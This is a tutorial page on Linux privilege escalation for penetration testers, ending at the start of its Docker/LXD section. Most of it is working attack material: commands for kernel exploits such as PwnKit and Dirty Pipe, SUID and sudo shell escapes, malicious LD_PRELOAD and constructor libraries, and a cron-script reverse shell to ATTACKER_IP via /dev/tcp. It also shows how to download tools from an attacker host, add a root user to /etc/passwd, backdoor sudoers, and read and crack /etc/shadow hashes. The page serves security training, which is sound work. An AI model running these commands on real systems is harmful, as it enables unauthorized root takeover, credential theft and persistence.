---
title: Linux Privilege Escalation Techniques
description: A comprehensive guide to understanding and exploiting Linux privilege escalation vectors — from enumeration to root — for penetration testers, red teamers, and defenders.
navigation:
  icon: i-lucide-arrow-up-from-line
---

## Introduction

**Privilege escalation** is the process of exploiting a vulnerability, misconfiguration, or design flaw to gain **elevated access** — typically from a low-privileged shell to **root**. It's one of the most critical phases in any penetration test or adversary simulation.

::note
Linux privilege escalation isn't about a single exploit — it's about **systematic enumeration** and chaining together small misconfigurations that lead to root.
::

::card-group
  ::card
  ---
  title: What You'll Learn
  icon: i-lucide-book-open
  ---
  - Systematic enumeration methodology
  - 15+ escalation techniques with examples
  - Kernel exploits, SUID, sudo, cron, capabilities
  - Container breakouts (Docker/LXD)
  - Detection and hardening strategies
  ::

  ::card
  ---
  title: Key Context
  icon: i-lucide-info
  ---
  - **Phase:** Post-Exploitation
  - **Goal:** `uid=0(root)` or equivalent
  - **MITRE ATT&CK:** [TA0004 — Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
  - **Difficulty:** Beginner → Advanced
  - **Platforms:** All Linux distributions
  ::
::

::caution
This content is for **authorized security testing and education only**. Performing privilege escalation on systems without explicit written permission is **illegal** and violates computer fraud laws worldwide.
::

---

## Understanding Linux Privileges

Before escalating, understand how Linux manages permissions and access.

### The Privilege Model

```
┌─────────────────────────────────────────────────────────┐
│                      root (UID 0)                       │
│         Full system control — no restrictions            │
├─────────────────────────────────────────────────────────┤
│                   System Services                        │
│    www-data, mysql, postgres, nobody (UID 1-999)        │
│    Limited access — run specific daemons                 │
├─────────────────────────────────────────────────────────┤
│                   Regular Users                          │
│    user1, user2, developer (UID 1000+)                  │
│    Home directory access — standard operations           │
├─────────────────────────────────────────────────────────┤
│                   Unprivileged Shell                     │
│    www-data via web shell, reverse shell                 │
│    Minimal access — your starting point                  │
└─────────────────────────────────────────────────────────┘
```

::card-group
  ::card
  ---
  title: UID / GID
  icon: i-lucide-user
  ---
  Every process runs with a **User ID (UID)** and **Group ID (GID)**. Root is always `UID 0`. The kernel checks these IDs for every privileged operation.
  ::

  ::card
  ---
  title: File Permissions
  icon: i-lucide-file-lock
  ---
  Standard `rwx` permissions plus special bits: **SUID** (run as file owner), **SGID** (run as file group), and **Sticky Bit** (restrict deletion).
  ::

  ::card
  ---
  title: Capabilities
  icon: i-lucide-key-round
  ---
  Linux capabilities split root's powers into **granular units**. Instead of full root, a binary can have just `cap_net_bind_service` or `cap_setuid`.
  ::

  ::card
  ---
  title: Namespaces & Cgroups
  icon: i-lucide-container
  ---
  Containers use namespaces for isolation and cgroups for resource limits. Misconfigurations can lead to **container breakouts** to the host.
  ::
::

### Key Files to Know

| File | Purpose | Escalation Relevance |
|---|---|---|
| `/etc/passwd` | User accounts & UIDs | Writable → add root user |
| `/etc/shadow` | Password hashes | Readable → crack passwords |
| `/etc/sudoers` | Sudo privileges | Misconfigured → root commands |
| `/etc/crontab` | System cron jobs | Writable scripts → code execution |
| `/etc/fstab` | Filesystem mounts | NFS `no_root_squash` → root access |
| `/etc/exports` | NFS share configuration | `no_root_squash` → root files |
| `/proc/version` | Kernel version | Kernel exploits |
| `/etc/os-release` | OS distribution info | Targeted exploits |

---

## Phase 1 — Enumeration

::tip
**Enumeration is everything.** Spend 80% of your time gathering information and 20% exploiting. Miss nothing.
::

### Manual Enumeration

::tabs
  :::tabs-item{icon="i-lucide-user" label="User & System Info"}
  ```bash [Terminal — Who Am I?]
  # Current user & groups
  id
  whoami
  groups

  # All users on the system
  cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1
  
  # Users with UID 0 (root equivalents)
  awk -F: '$3 == 0 {print $1}' /etc/passwd

  # Currently logged in users
  w
  who
  last -a | head -20

  # User's home directories
  ls -la /home/
  ls -la /root/ 2>/dev/null
  ```

  ```bash [Terminal — System Information]
  # OS and kernel version
  uname -a
  cat /etc/os-release
  cat /proc/version
  lsb_release -a 2>/dev/null

  # Architecture
  uname -m
  arch

  # Hostname & domain
  hostname
  hostname -f
  cat /etc/hostname

  # Environment variables (may contain creds)
  env
  set
  cat /proc/self/environ 2>/dev/null | tr '\0' '\n'
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Sudo & SUID"}
  ```bash [Terminal — Sudo Privileges]
  # What can current user run as sudo?
  sudo -l

  # Check sudo version (older versions have exploits)
  sudo -V | head -1

  # Try sudo without password
  sudo -n id 2>/dev/null
  ```

  ```bash [Terminal — SUID/SGID Binaries]
  # Find all SUID binaries
  find / -perm -4000 -type f 2>/dev/null

  # Find all SGID binaries
  find / -perm -2000 -type f 2>/dev/null

  # Find both SUID and SGID
  find / -perm -u=s -o -perm -g=s -type f 2>/dev/null

  # Compare against default SUID binaries (spot custom ones)
  find / -perm -4000 -type f 2>/dev/null | xargs ls -la
  ```
  :::

  :::tabs-item{icon="i-lucide-file-search" label="Files & Permissions"}
  ```bash [Terminal — Interesting Files]
  # World-writable files
  find / -writable -type f 2>/dev/null | grep -v "proc\|sys"

  # World-writable directories
  find / -writable -type d 2>/dev/null

  # Files owned by current user
  find / -user $(whoami) -type f 2>/dev/null | grep -v "proc\|sys"

  # Recently modified files (last 10 minutes)
  find / -mmin -10 -type f 2>/dev/null | grep -v "proc\|sys\|run"

  # Config files with potential credentials
  find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" \
    -o -name "*.ini" -o -name "*.env" -o -name "*.bak" \
    2>/dev/null | head -50

  # Readable shadow file?
  cat /etc/shadow 2>/dev/null

  # SSH keys
  find / -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" \
    2>/dev/null
  
  # History files
  cat ~/.bash_history 2>/dev/null
  cat ~/.mysql_history 2>/dev/null
  cat ~/.python_history 2>/dev/null
  ```
  :::

  :::tabs-item{icon="i-lucide-network" label="Network & Services"}
  ```bash [Terminal — Network Enumeration]
  # Network interfaces & IPs
  ip a
  ifconfig 2>/dev/null

  # Routing table
  ip route
  route -n 2>/dev/null

  # Active connections & listening ports
  ss -tulnp
  netstat -tulnp 2>/dev/null

  # ARP table (other hosts on the network)
  ip neigh
  arp -a 2>/dev/null

  # DNS configuration
  cat /etc/resolv.conf

  # Hosts file
  cat /etc/hosts

  # Firewall rules
  iptables -L -n 2>/dev/null
  ```

  ```bash [Terminal — Running Services]
  # Running processes (look for services running as root)
  ps aux | grep root
  ps -ef

  # Services / systemd units
  systemctl list-units --type=service --state=running
  
  # Cron jobs
  crontab -l 2>/dev/null
  ls -la /etc/cron* 2>/dev/null
  cat /etc/crontab
  systemctl list-timers --all 2>/dev/null

  # Installed packages (look for outdated vulnerable software)
  dpkg -l 2>/dev/null | head -50
  rpm -qa 2>/dev/null | head -50
  ```
  :::

  :::tabs-item{icon="i-lucide-key-round" label="Capabilities & Mounts"}
  ```bash [Terminal — Capabilities]
  # Find binaries with capabilities set
  getcap -r / 2>/dev/null

  # Common dangerous capabilities:
  # cap_setuid    → change UID to root
  # cap_setgid    → change GID to root
  # cap_dac_override → bypass file permission checks
  # cap_sys_admin → mount filesystems, BPF, etc.
  # cap_net_raw   → raw sockets (packet capture)
  ```

  ```bash [Terminal — Mounted Filesystems]
  # Current mounts
  mount
  cat /etc/fstab

  # NFS shares
  showmount -e localhost 2>/dev/null
  cat /etc/exports 2>/dev/null

  # Unmounted filesystems
  cat /etc/fstab | grep -v "^#"

  # Find disk/partitions
  lsblk
  fdisk -l 2>/dev/null
  ```
  :::
::

### Automated Enumeration Tools

Run these to catch anything manual enumeration missed:

::tabs
  :::tabs-item{icon="i-lucide-bot" label="LinPEAS"}
  ```bash [Terminal — LinPEAS]
  # Download and run (recommended first tool)
  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

  # Or transfer to target and run
  wget http://ATTACKER_IP/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh -a | tee linpeas_output.txt

  # Run specific checks only
  ./linpeas.sh -s    # Silent mode (less output)
  ./linpeas.sh -e    # Extra enumeration
  ```

  ::tip
  LinPEAS color codes findings: 🔴 **RED/YELLOW** = almost certainly an escalation vector. Focus on these first.
  ::
  :::

  :::tabs-item{icon="i-lucide-bot" label="LinEnum"}
  ```bash [Terminal — LinEnum]
  # Download and run
  wget http://ATTACKER_IP/LinEnum.sh
  chmod +x LinEnum.sh
  ./LinEnum.sh -t -r report.txt

  # -t: thorough tests
  # -r: export to report file
  ```
  :::

  :::tabs-item{icon="i-lucide-bot" label="linux-exploit-suggester"}
  ```bash [Terminal — Kernel Exploit Suggester]
  # Suggest kernel exploits based on kernel version
  wget http://ATTACKER_IP/linux-exploit-suggester.sh
  chmod +x linux-exploit-suggester.sh
  ./linux-exploit-suggester.sh

  # Or the Python version (more up-to-date)
  python3 linux-exploit-suggester-2.py
  ```
  :::

  :::tabs-item{icon="i-lucide-bot" label="pspy"}
  ```bash [Terminal — pspy (Process Spy)]
  # Monitor processes WITHOUT root — catches cron jobs and
  # background tasks that other tools miss

  wget http://ATTACKER_IP/pspy64
  chmod +x pspy64
  ./pspy64 -pf -i 1000

  # -pf: print commands and file system events
  # -i:  scan interval in milliseconds

  # Watch for processes running as UID=0 (root)
  # Especially cron jobs and scripts
  ```

  ::warning
  `pspy` is essential for discovering **cron jobs running as root** that aren't visible in standard crontab files. Let it run for at least **5 minutes** to catch scheduled tasks.
  ::
  :::
::

---

## Phase 2 — Exploitation Techniques

### Technique 1 — Kernel Exploits

The kernel runs with **full root privileges**. A vulnerability in the kernel = instant root.

::accordion
  :::accordion-item{icon="i-lucide-alert-triangle" label="How It Works"}
  The Linux kernel manages all hardware, memory, and process operations at the highest privilege level (**Ring 0**). If you can trigger a bug in kernel code — buffer overflow, race condition, use-after-free — you can execute arbitrary code as root.

  ```
  User Space (Ring 3)        Kernel Space (Ring 0)
  ┌──────────────────┐       ┌──────────────────────┐
  │  Your low-priv   │       │                      │
  │  shell process   │──────▶│  Kernel vulnerability │
  │  (www-data)      │ syscall│  triggers root code  │
  │                  │       │  execution            │
  └──────────────────┘       └──────────┬───────────┘
                                        │
                              UID 0 shell spawned
  ```
  :::

  :::accordion-item{icon="i-lucide-flame" label="Notable Kernel Exploits"}
  | CVE | Name | Kernel Versions | Year |
  |---|---|---|---|
  | CVE-2024-1086 | **nf_tables Use-After-Free** | 5.14 – 6.6 | 2024 |
  | CVE-2023-0386 | **OverlayFS Privilege Escalation** | < 6.2 | 2023 |
  | CVE-2022-0847 | **Dirty Pipe** | 5.8 – 5.16.11 | 2022 |
  | CVE-2022-2588 | **Dirty Cred** | 5.x | 2022 |
  | CVE-2021-4034 | **PwnKit (pkexec)** | All (polkit) | 2022 |
  | CVE-2021-3156 | **Baron Samedit (sudo)** | sudo < 1.9.5p2 | 2021 |
  | CVE-2016-5195 | **Dirty COW** | 2.6.22 – 4.8.3 | 2016 |
  | CVE-2009-1185 | **udev** | < 2.6.30 | 2009 |
  :::

  :::accordion-item{icon="i-lucide-code" label="Exploitation Example — Dirty Pipe (CVE-2022-0847)"}
  ```bash [Terminal — Check if Vulnerable]
  # Check kernel version
  uname -r
  # Vulnerable: 5.8 <= version <= 5.16.11, 5.15.25, 5.10.102

  cat /proc/version
  ```

  ```bash [Terminal — Compile and Run]
  # Download exploit
  wget http://ATTACKER_IP/dirtypipe.c

  # Compile on target
  gcc dirtypipe.c -o dirtypipe

  # Option 1: Overwrite /etc/passwd to add root user
  ./dirtypipe /etc/passwd 1 "${openssl_hash}"

  # Option 2: Use the SUID variant
  gcc dirtypipez.c -o dirtypipez
  ./dirtypipez
  # Spawns root shell immediately
  ```

  ```c [dirtypipe.c — Simplified Concept]
  /*
   * Dirty Pipe exploits a flaw in the pipe buffer flags.
   * The PIPE_BUF_FLAG_CAN_MERGE flag allows overwriting
   * data in page cache — including read-only files.
   *
   * Result: Write to ANY file on the system as root,
   * even if you have zero permissions on it.
   */
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="Exploitation Example — PwnKit (CVE-2021-4034)"}
  ```bash [Terminal — PwnKit (Works on Almost Everything)]
  # PwnKit exploits a memory corruption in pkexec (polkit)
  # Affected: Every major Linux distro since 2009

  # Check if pkexec exists
  which pkexec
  pkexec --version

  # Method 1: Pre-compiled binary
  curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
  chmod +x PwnKit
  ./PwnKit    # Instant root shell

  # Method 2: Compile from source
  gcc cve-2021-4034.c -o pwnkit
  ./pwnkit

  # Method 3: Python version (no compilation needed)
  python3 CVE-2021-4034.py
  ```

  ::warning
  PwnKit works on nearly **every Linux distribution** installed between 2009–2022 unless specifically patched. It's often the fastest path to root in CTFs and real engagements.
  ::
  :::
::

---

### Technique 2 — SUID / SGID Binaries

When a binary has the **SUID bit** set, it runs with the **file owner's privileges** — typically root.

::steps{level="4"}

#### Find SUID Binaries

```bash [Terminal]
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common output:
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/find          # ← DANGEROUS
/usr/bin/vim           # ← DANGEROUS
/usr/bin/python3       # ← DANGEROUS
/usr/local/bin/backup  # ← CUSTOM — investigate!
```

#### Check GTFOBins

Cross-reference found SUID binaries with [GTFOBins](https://gtfobins.github.io/) — a curated list of Unix binaries that can be exploited:

```bash [Terminal — SUID Exploitation Examples]
# ── find (SUID) ──
find . -exec /bin/sh -p \; -quit
# The -p flag preserves the effective UID (root)

# ── vim (SUID) ──
vim -c ':!/bin/sh'
# Or
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-p")'

# ── python3 (SUID) ──
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# ── bash (SUID) ──
bash -p
# -p prevents bash from dropping privileges

# ── cp (SUID) ──
# Copy /etc/shadow to readable location
cp /etc/shadow /tmp/shadow_copy
cat /tmp/shadow_copy

# ── nmap (old versions with SUID) ──
nmap --interactive
!sh

# ── env (SUID) ──
env /bin/sh -p

# ── php (SUID) ──
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

#### Exploit Custom SUID Binaries

Custom SUID binaries are the most common escalation vector — developers often make mistakes:

```bash [Terminal — Analyze Custom Binary]
# Check what the binary does
strings /usr/local/bin/backup
ltrace /usr/local/bin/backup 2>&1
strace /usr/local/bin/backup 2>&1

# Example output from strings:
# "Backing up files..."
# "tar czf /tmp/backup.tar.gz /home/user"
# ↑ Uses 'tar' without absolute path = PATH hijacking!

# Example: Binary calls system("curl http://...")
# → You can hijack the 'curl' command via PATH
```

::

::tip{to="https://gtfobins.github.io/#+suid"}
**Always check GTFOBins** for every SUID binary you find. Filter by the `SUID` tag to see only exploitable techniques.
::

---

### Technique 3 — Sudo Misconfigurations

`sudo` allows users to run commands as root. Misconfigurations here are **extremely common**.

```bash [Terminal — Check Sudo Privileges]
sudo -l
```

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Common Sudo Escalations"}
  ```bash [Terminal — Exploitable Sudo Entries]
  # ── sudo vim ──
  # (user) NOPASSWD: /usr/bin/vim
  sudo vim -c ':!/bin/bash'

  # ── sudo find ──
  # (user) NOPASSWD: /usr/bin/find
  sudo find / -exec /bin/bash \; -quit

  # ── sudo awk ──
  # (user) NOPASSWD: /usr/bin/awk
  sudo awk 'BEGIN {system("/bin/bash")}'

  # ── sudo less / more ──
  # (user) NOPASSWD: /usr/bin/less
  sudo less /etc/hosts
  !/bin/bash

  # ── sudo man ──
  # (user) NOPASSWD: /usr/bin/man
  sudo man man
  !/bin/bash

  # ── sudo nmap ──
  # (user) NOPASSWD: /usr/bin/nmap
  echo 'os.execute("/bin/bash")' > /tmp/shell.nse
  sudo nmap --script=/tmp/shell.nse

  # ── sudo env ──
  # (user) NOPASSWD: /usr/bin/env
  sudo env /bin/bash

  # ── sudo python3 ──
  # (user) NOPASSWD: /usr/bin/python3
  sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

  # ── sudo perl ──
  # (user) NOPASSWD: /usr/bin/perl
  sudo perl -e 'exec "/bin/bash";'

  # ── sudo ruby ──
  # (user) NOPASSWD: /usr/bin/ruby
  sudo ruby -e 'exec "/bin/bash"'

  # ── sudo tar ──
  # (user) NOPASSWD: /usr/bin/tar
  sudo tar cf /dev/null /dev/null --checkpoint=1 \
    --checkpoint-action=exec=/bin/bash

  # ── sudo zip ──
  # (user) NOPASSWD: /usr/bin/zip
  sudo zip /tmp/x.zip /etc/hosts -T \
    --unzip-command="sh -c /bin/bash"

  # ── sudo apache2 ──
  # (user) NOPASSWD: /usr/sbin/apache2
  sudo apache2 -f /etc/shadow
  # Leaks first line of shadow file in error message

  # ── sudo wget ──
  # (user) NOPASSWD: /usr/bin/wget
  # Overwrite /etc/passwd or /etc/shadow
  sudo wget http://ATTACKER/malicious_passwd -O /etc/passwd

  # ── sudo tee ──
  # (user) NOPASSWD: /usr/bin/tee
  echo "hacker::0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
  ```
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="Sudo Environment Tricks"}
  ```bash [Terminal — LD_PRELOAD Exploitation]
  # If sudo -l shows: env_keep+=LD_PRELOAD
  # You can inject a malicious shared library!

  cat > /tmp/shell.c << 'EOF'
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>

  void _init() {
      unsetenv("LD_PRELOAD");
      setuid(0);
      setgid(0);
      system("/bin/bash -p");
  }
  EOF

  gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
  sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any-allowed-command
  # Instant root shell!
  ```

  ```bash [Terminal — LD_LIBRARY_PATH Exploitation]
  # If sudo -l shows: env_keep+=LD_LIBRARY_PATH
  # Hijack shared libraries used by the allowed command

  # 1. Find what libraries the command loads
  ldd /usr/bin/allowed-command

  # 2. Create malicious library
  cat > /tmp/libcustom.c << 'EOF'
  #include <stdio.h>
  #include <stdlib.h>

  static void hijack() __attribute__((constructor));

  void hijack() {
      unsetenv("LD_LIBRARY_PATH");
      setresuid(0,0,0);
      system("/bin/bash -p");
  }
  EOF

  gcc -fPIC -shared -o /tmp/libcustom.so /tmp/libcustom.c

  # 3. Run with hijacked library path
  sudo LD_LIBRARY_PATH=/tmp /usr/bin/allowed-command
  ```
  :::

  :::tabs-item{icon="i-lucide-bug" label="Sudo Version Exploits"}
  ```bash [Terminal — Check Sudo Version]
  sudo -V | head -1
  # Sudo version 1.8.31
  ```

  | CVE | Sudo Version | Technique |
  |---|---|---|
  | CVE-2021-3156 (Baron Samedit) | < 1.9.5p2 | Heap overflow in sudoedit |
  | CVE-2019-14287 | < 1.8.28 | `sudo -u#-1` bypasses RunAs restriction |
  | CVE-2019-18634 | < 1.8.26 | Buffer overflow when `pwfeedback` enabled |

  ```bash [Terminal — CVE-2019-14287]
  # If sudo -l shows:
  # (ALL, !root) NOPASSWD: /usr/bin/bash
  # The "!root" should prevent running as root... but:

  sudo -u#-1 /usr/bin/bash
  # UID -1 is interpreted as UID 0 (root)!
  # Bypasses the restriction entirely
  ```

  ```bash [Terminal — CVE-2021-3156 (Baron Samedit)]
  # Check vulnerability
  sudoedit -s '\' 2>&1 | grep -q "sudoedit:" && echo "VULNERABLE"

  # Exploit (multiple versions available)
  git clone https://github.com/blasty/CVE-2021-3156.git
  cd CVE-2021-3156
  make
  ./sudo-hax-me-a-sandwich 0
  # Try different target numbers (0, 1, 2...) for your distro
  ```
  :::
::

---

### Technique 4 — Cron Job Exploitation

Cron jobs run commands on a **schedule** — often as **root**. If you can modify the script or command a cron job executes, you get root.

::steps{level="4"}

#### Discover Cron Jobs

```bash [Terminal — Enumerate All Cron Sources]
# System crontab
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# User crontabs
crontab -l
ls -la /var/spool/cron/crontabs/ 2>/dev/null

# Systemd timers (modern replacement for cron)
systemctl list-timers --all

# Use pspy to catch hidden cron jobs
./pspy64 -pf -i 1000
# Watch for UID=0 processes appearing on schedule
```

#### Identify Writable Scripts

```bash [Terminal — Example Crontab]
cat /etc/crontab
# * * * * * root /opt/scripts/backup.sh
# */5 * * * * root /usr/local/bin/cleanup.py

# Check permissions on the script
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root 245 Jan 15 10:00 /opt/scripts/backup.sh
#       ^^^ World-writable! We can modify it!
```

#### Inject Reverse Shell

```bash [Terminal — Modify the Cron Script]
# Option 1: Append a reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/scripts/backup.sh

# Option 2: Copy bash as SUID
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh

# Option 3: Add current user to sudoers
echo 'echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' >> /opt/scripts/backup.sh

# Wait for cron to execute, then:
/tmp/rootbash -p    # If using option 2
sudo su             # If using option 3
```

#### Cron PATH Hijacking

```bash [Terminal — PATH Variable in Crontab]
cat /etc/crontab
# PATH=/home/user:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
# * * * * * root backup
#               ^^^^^^ No absolute path!

# The cron PATH includes /home/user FIRST
# Create a malicious 'backup' script there:
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /home/user/backup
chmod +x /home/user/backup

# Wait for cron to run, then:
/tmp/rootbash -p
```

::

::warning
Cron runs jobs with a **minimal environment**. The `PATH` in `/etc/crontab` is often different from interactive shells — always check it.
::

---

### Technique 5 — PATH Variable Hijacking

If a privileged script or SUID binary calls a command **without its full path**, you can create a malicious version that runs first.

```bash [Terminal — PATH Hijacking]
# 1. Identify vulnerable binary (calls 'service' without full path)
strings /usr/local/bin/suid-binary
# Output includes: "service apache2 restart"
#                   ^^^^^^^ no absolute path!

# 2. Create malicious 'service' command
echo '#!/bin/bash
/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# 3. Prepend /tmp to PATH
export PATH=/tmp:$PATH

# 4. Run the SUID binary — it finds OUR 'service' first
/usr/local/bin/suid-binary
# Root shell spawned!
```

```
Normal PATH resolution:
  service → /usr/sbin/service ✅ (legitimate)

Hijacked PATH resolution:
  service → /tmp/service ❌ (attacker's script) → bash -p → root!
```

---

### Technique 6 — Linux Capabilities

Capabilities provide **fine-grained root powers** to individual binaries. Some are equivalent to full root.

```bash [Terminal — Find Binaries with Capabilities]
getcap -r / 2>/dev/null
```

::accordion
  :::accordion-item{icon="i-lucide-key-round" label="Dangerous Capabilities"}

  | Capability | Risk | Effect |
  |---|---|---|
  | `cap_setuid` | 🔴 Critical | Change UID to 0 (root) |
  | `cap_setgid` | 🔴 Critical | Change GID to 0 |
  | `cap_dac_override` | 🔴 Critical | Bypass all file permission checks |
  | `cap_dac_read_search` | 🟠 High | Read any file on the system |
  | `cap_sys_admin` | 🔴 Critical | Mount filesystems, eBPF, trace |
  | `cap_sys_ptrace` | 🟠 High | Attach to and modify any process |
  | `cap_net_raw` | 🟡 Medium | Raw sockets — packet capture |
  | `cap_fowner` | 🟠 High | Bypass ownership checks on files |
  | `cap_chown` | 🟠 High | Change file ownership |

  :::

  :::accordion-item{icon="i-lucide-code" label="Exploitation Examples"}
  ```bash [Terminal — cap_setuid on Python]
  # getcap output: /usr/bin/python3 = cap_setuid+ep
  
  /usr/bin/python3 -c '
  import os
  os.setuid(0)
  os.system("/bin/bash")
  '
  # Root shell!
  ```

  ```bash [Terminal — cap_setuid on Perl]
  # getcap output: /usr/bin/perl = cap_setuid+ep
  
  /usr/bin/perl -e '
  use POSIX qw(setuid);
  POSIX::setuid(0);
  exec "/bin/bash";
  '
  ```

  ```bash [Terminal — cap_dac_read_search on tar]
  # getcap output: /usr/bin/tar = cap_dac_read_search+ep
  # Can read ANY file — extract /etc/shadow
  
  tar czf /tmp/shadow.tar.gz /etc/shadow
  cd /tmp && tar xzf shadow.tar.gz
  cat etc/shadow
  # Crack the hashes with hashcat/john
  ```

  ```bash [Terminal — cap_sys_admin (mount)]
  # Extremely dangerous — can mount host filesystem in containers
  # Or create device files to access raw disk
  
  mkdir /tmp/mnt
  mount /dev/sda1 /tmp/mnt
  cat /tmp/mnt/etc/shadow
  # Or modify /tmp/mnt/etc/passwd to add a root user
  ```
  :::
::

---

### Technique 7 — NFS no_root_squash

When an NFS share is exported with `no_root_squash`, a **remote root user** can create files as root on the share — including SUID binaries.

::steps{level="4"}

#### Identify Vulnerable Shares

```bash [On Target — Check NFS Exports]
cat /etc/exports
# /shared    *(rw,sync,no_root_squash)
#                     ^^^^^^^^^^^^^^^^ VULNERABLE!

showmount -e TARGET_IP
# /shared   *
```

#### Mount and Exploit

```bash [On Attacker Machine — as root]
# 1. Mount the NFS share
mkdir /tmp/nfs
mount -t nfs TARGET_IP:/shared /tmp/nfs

# 2. Create a SUID binary (as root on attacker)
cat > /tmp/nfs/shell.c << 'EOF'
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
EOF

gcc /tmp/nfs/shell.c -o /tmp/nfs/shell
chmod +s /tmp/nfs/shell    # Set SUID bit
ls -la /tmp/nfs/shell
# -rwsr-sr-x 1 root root ... shell
```

#### Execute on Target

```bash [On Target — Run the SUID Binary]
/shared/shell
# whoami → root
```

::

---

### Technique 8 — Writable /etc/passwd or /etc/shadow

::tabs
  :::tabs-item{icon="i-lucide-file-edit" label="Writable /etc/passwd"}
  ```bash [Terminal — Add a Root User]
  # Check if /etc/passwd is writable
  ls -la /etc/passwd
  # -rw-rw-rw- 1 root root ... /etc/passwd  ← WRITABLE!

  # Generate a password hash
  openssl passwd -6 -salt xyz hacked
  # Output: $6$xyz$...hash...

  # Method 1: Add a new root user (UID 0)
  echo 'hacker:$6$xyz$HASH_HERE:0:0:root:/root:/bin/bash' >> /etc/passwd
  su hacker
  # Password: hacked → root!

  # Method 2: Remove root's password
  # Change root:x: to root:: (empty password field)
  sed -i 's/root:x:/root::/' /etc/passwd
  su root
  # No password needed!
  ```
  :::

  :::tabs-item{icon="i-lucide-file-key" label="Readable /etc/shadow"}
  ```bash [Terminal — Crack Password Hashes]
  # Check if shadow is readable
  cat /etc/shadow 2>/dev/null

  # If readable, extract hashes
  cat /etc/shadow | grep -v "!\|*" > hashes.txt

  # Transfer to attacker machine and crack
  # John the Ripper
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

  # Hashcat (GPU — much faster)
  # $6$ = SHA-512 = mode 1800
  hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt

  # $y$ = yescrypt = mode 22921 (newer distros)
  hashcat -m 22921 hashes.txt /usr/share/wordlists/rockyou.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-file-edit" label="Writable /etc/shadow"}
  ```bash [Terminal — Replace Root's Hash]
  # Generate a known hash
  openssl passwd -6 -salt hacked password123
  # $6$hacked$...

  # Replace root's hash in shadow
  # Use a tool or careful sed:
  cp /etc/shadow /etc/shadow.bak
  sed -i 's|root:.*:|root:$6$hacked$YOUR_HASH:19000:0:99999:7:::|' /etc/shadow

  su root
  # Password: password123
  ```
  :::
::

---

### Technique 9 — Wildcard Injection

When scripts use wildcards (`*`) with commands like `tar`, `chown`, or `rsync`, filenames can be interpreted as **command flags**.

```bash [Terminal — Tar Wildcard Injection]
# Scenario: Cron job runs as root
# * * * * * root cd /opt/backup && tar czf /tmp/backup.tar.gz *

# The wildcard (*) expands filenames — including specially crafted ones!

# 1. Create payload files in /opt/backup
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /opt/backup/shell.sh
chmod +x /opt/backup/shell.sh

# 2. Create filenames that tar interprets as flags
touch /opt/backup/--checkpoint=1
touch /opt/backup/'--checkpoint-action=exec=sh shell.sh'

# 3. When cron runs: tar czf /tmp/backup.tar.gz *
# It expands to:
# tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh file1 file2
# ↑ These filenames become TAR FLAGS!

# 4. Wait for cron, then:
/tmp/rootbash -p
# Root!
```

```bash [Terminal — Chown/Chmod Wildcard Injection]
# Scenario: root runs: chown user:user /some/dir/*

# Create a symlink to /etc/shadow
ln -s /etc/shadow /some/dir/shadow_link

# Create flag filename
touch /some/dir/'--reference=shadow_link'

# When chown runs with *, it changes /etc/shadow ownership!
```

::note
Wildcard injection works because the **shell expands `*`** before passing arguments to the command. The command sees filenames starting with `--` as flags, not files.
::

---

### Technique 10 — Shared Library Hijacking

If a SUID binary or root service loads shared libraries from a **writable location**, you can inject malicious code.

```bash [Terminal — Find Hijackable Libraries]
# Check what libraries a SUID binary loads
ldd /usr/local/bin/suid-binary

# Look for:
# 1. Libraries loaded from writable directories
# 2. "not found" libraries (you can create them!)
# 3. RPATH/RUNPATH set to writable locations

readelf -d /usr/local/bin/suid-binary | grep -i "rpath\|runpath"
# RUNPATH: /tmp/lib    ← Writable!
```

```c [/tmp/lib/libcustom.so — Malicious Library]
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Constructor runs when library is loaded
static void escalate() __attribute__((constructor));

void escalate() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash [Terminal — Compile and Trigger]
# Compile the malicious library
gcc -fPIC -shared -o /tmp/lib/libcustom.so /tmp/lib/libcustom.c

# Run the SUID binary — it loads our library
/usr/local/bin/suid-binary
# Root shell!
```

---

### Technique 11 — Docker / LXD Group Membership

Being in the `docker` or `lxd` group is **effectively root access**.

::tabs
